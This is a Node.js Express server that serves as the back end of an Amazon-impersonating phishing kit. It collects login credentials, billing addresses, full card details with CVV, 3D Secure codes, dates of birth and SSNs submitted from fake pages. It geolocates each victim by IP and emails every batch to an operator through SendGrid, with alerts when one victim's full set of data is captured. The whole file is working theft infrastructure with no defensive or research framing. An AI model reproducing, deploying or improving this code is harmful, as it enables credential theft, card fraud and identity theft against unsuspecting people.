Serv

const express = require('express');
const cors = require('cors');
const sgMail = require('@sendgrid/mail');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Initialize SendGrid
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Store user sessions to track complete user journeys
const userSessions = new Map();

// Function to get IP location data
async function getIPLocation(ip) {
    try {
        if (ip === 'unknown' || ip === '127.0.0.1') return null;
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        if (data.status === 'success') return data;
        return null;
    } catch (error) {
        console.error('Error fetching IP location:', error);
        return null;
    }
}

// Function to format data for email based on page type
function formatDataForEmail(data, pageType, ipLocation = null) {
    const timestamp = new Date().toLocaleString();
    
    let emailContent = `=== AMAZON DATA COLLECTION ===\n`;
    emailContent += `Collection Time: ${timestamp}\n`;
    emailContent += `Page Type: ${pageType.toUpperCase()}\n`;
    emailContent += `IP Address: ${data.ip_address || 'N/A'}\n`;
    
    if (ipLocation) {
        emailContent += `Location: ${ipLocation.city || 'N/A'}, ${ipLocation.regionName || 'N/A'}, ${ipLocation.country || 'N/A'}\n`;
        emailContent += `ISP: ${ipLocation.isp || 'N/A'}\n`;
    }
    
    emailContent += `User Agent: ${data.user_agent || 'N/A'}\n`;
    emailContent += `Screen Resolution: ${data.screen_resolution || 'N/A'}\n`;
    emailContent += `Language: ${data.language || 'N/A'}\n`;
    emailContent += `Timezone: ${data.timezone || 'N/A'}\n\n`;

    switch (pageType) {
        case 'login':
            emailContent += `--- LOGIN CREDENTIALS ---\n`;
            emailContent += `Email: ${data.email || 'N/A'}\n`;
            emailContent += `Password: ${data.password || 'N/A'}\n`;
            emailContent += `Remember Me: ${data.rememberMe ? 'Yes' : 'No'}\n`;
            break;

        case 'address':
            emailContent += `--- BILLING ADDRESS ---\n`;
            emailContent += `Full Name: ${data.fullname || 'N/A'}\n`;
            emailContent += `Address Line 1: ${data.add1 || 'N/A'}\n`;
            emailContent += `Address Line 2: ${data.add2 || 'N/A'}\n`;
            emailContent += `City: ${data.city || 'N/A'}\n`;
            emailContent += `State: ${data.state || 'N/A'}\n`;
            emailContent += `ZIP Code: ${data.zip || 'N/A'}\n`;
            emailContent += `Phone: ${data.phone || 'N/A'}\n`;
            emailContent += `Country: ${data.country || 'N/A'}\n`;
            break;

        case 'payment':
            emailContent += `--- PAYMENT INFORMATION ---\n`;
            emailContent += `Card Holder: ${data.holder || 'N/A'}\n`;
            emailContent += `Card Number: ${data.ccnum || 'N/A'}\n`;
            emailContent += `Expiry Date: ${data.EXP1 || 'N/A'}/${data.EXP2 || 'N/A'}\n`;
            emailContent += `CVV: ${data.cvv2 || 'N/A'}\n`;
            emailContent += `3D Secure (VBV/MSC): ${data.vbv || 'Not Provided'}\n`;
            emailContent += `Date of Birth: ${data.dob || 'Not Provided'}\n`;
            emailContent += `SSN: ${data.ssn || 'Not Provided'}\n`;
            break;

        default:
            emailContent += `--- RAW DATA ---\n`;
            emailContent += `${JSON.stringify(data, null, 2)}\n`;
    }

    // Add technical data if available
    if (data.cookies_enabled !== undefined) {
        emailContent += `\n--- TECHNICAL DATA ---\n`;
        emailContent += `Cookies Enabled: ${data.cookies_enabled ? 'Yes' : 'No'}\n`;
    }

    return emailContent;
}

// Function to send email via SendGrid
async function sendEmail(data, pageType) {
    try {
        // Get IP location data
        const ipLocation = await getIPLocation(data.ip_address);
        
        const emailContent = formatDataForEmail(data, pageType, ipLocation);
        const subject = `Amazon ${pageType.charAt(0).toUpperCase() + pageType.slice(1)} Data - ${data.ip_address || 'Unknown IP'}`;

        const msg = {
            to: process.env.TO_EMAIL,
            from: process.env.FROM_EMAIL,
            subject: subject,
            text: emailContent,
        };

        const result = await sgMail.send(msg);
        console.log(`✅ Email sent successfully for ${pageType} page from IP: ${data.ip_address}`);
        return { success: true, messageId: result[0].headers['x-message-id'] };
    } catch (error) {
        console.error('❌ Error sending email:', error);
        if (error.response) {
            console.error('SendGrid error details:', error.response.body);
        }
        return { success: false, error: error.message };
    }
}

// Function to determine page type based on received data
function determinePageType(data) {
    if (data.email && data.password) {
        return 'login';
    } else if (data.fullname && data.add1 && data.city) {
        return 'address';
    } else if (data.holder && data.ccnum && data.cvv2) {
        return 'payment';
    }
    return 'unknown';
}

// Main endpoint to receive data from all pages
app.post('/api/submit', async (req, res) => {
    try {
        const data = req.body;
        console.log('📨 Received data from:', data.ip_address || 'Unknown IP');
        
        // Determine page type
        const pageType = determinePageType(data);
        console.log(`📄 Page type detected: ${pageType}`);

        // Store in session for tracking
        const sessionId = data.ip_address || 'unknown';
        if (!userSessions.has(sessionId)) {
            userSessions.set(sessionId, {
                login: null,
                address: null,
                payment: null,
                firstSeen: new Date(),
                lastActivity: new Date()
            });
        }

        const session = userSessions.get(sessionId);
        session[pageType] = { 
            data: data, 
            timestamp: new Date(),
            pageType: pageType
        };
        session.lastActivity = new Date();

        // Send email
        const emailResult = await sendEmail(data, pageType);

        if (emailResult.success) {
            res.status(200).json({ 
                success: true, 
                message: `Data received and email sent for ${pageType} page`,
                pageType: pageType,
                messageId: emailResult.messageId
            });
            
            // Log complete session if all pages are filled
            if (session.login && session.address && session.payment) {
                console.log(`🎯 Complete session collected for IP: ${sessionId}`);
                console.log(`   Login: ${session.login.timestamp}`);
                console.log(`   Address: ${session.address.timestamp}`);
                console.log(`   Payment: ${session.payment.timestamp}`);
                
                // Send completion notification
                const completionMsg = {
                    to: process.env.TO_EMAIL,
                    from: process.env.FROM_EMAIL,
                    subject: `🎯 COMPLETE SESSION - Amazon Data Collection - ${sessionId}`,
                    text: `Complete Amazon session collected!\n\nIP: ${sessionId}\nLogin: ${session.login.timestamp}\nAddress: ${session.address.timestamp}\nPayment: ${session.payment.timestamp}\n\nAll data has been sent in separate emails.`
                };
                
                try {
                    await sgMail.send(completionMsg);
                    console.log(`✅ Completion email sent for session: ${sessionId}`);
                } catch (error) {
                    console.error('Error sending completion email:', error);
                }
            }
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'Data received but email failed to send',
                error: emailResult.error
            });
        }

    } catch (error) {
        console.error('❌ Server error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: error.message
        });
    }
});

// Additional endpoint to get session statistics
app.get('/api/sessions', (req, res) => {
    const stats = {
        totalSessions: userSessions.size,
        sessionsWithLogin: Array.from(userSessions.values()).filter(s => s.login).length,
        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.address).length,
        sessionsWithPayment: Array.from(userSessions.values()).filter(s => s.payment).length,
        completeSessions: Array.from(userSessions.values()).filter(s => s.login && s.address && s.payment).length,
        activeLast24h: Array.from(userSessions.values()).filter(s => 
            new Date() - s.lastActivity < 24 * 60 * 60 * 1000
        ).length
    };

    res.json(stats);
});

// Endpoint to get specific session details
app.get('/api/session/:ip', (req, res) => {
    const session = userSessions.get(req.params.ip);
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    res.json(session);
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        sessions: userSessions.size
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ 
        message: 'Amazon Data Receiver API',
        version: '1.0.0',
        endpoints: {
            '/api/submit': 'POST - Receive form data',
            '/api/sessions': 'GET - Session statistics',
            '/api/health': 'GET - Health check'
        }
    });
});

// Clean up old sessions (run every hour)
setInterval(() => {
    const now = new Date();
    const twentyFourHoursAgo = new Date(now.getTime() - (24 * 60 * 60 * 1000));
    
    let cleanedCount = 0;
    for (const [sessionId, session] of userSessions.entries()) {
        if (session.lastActivity < twentyFourHoursAgo) {
            userSessions.delete(sessionId);
            cleanedCount++;
        }
    }
    
    if (cleanedCount > 0) {
        console.log(`🧹 Cleaned up ${cleanedCount} old sessions`);
    }
}, 60 * 60 * 1000);

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📧 Emails will be sent to: ${process.env.TO_EMAIL}`);
    console.log(`🔗 Health check: http://localhost:${PORT}/api/health`);
    console.log(`📊 Session stats: http://localhost:${PORT}/api/sessions`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 Received SIGTERM, shutting down gracefully');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('🛑 Received SIGINT, shutting down gracefully');
    process.exit(0);
});
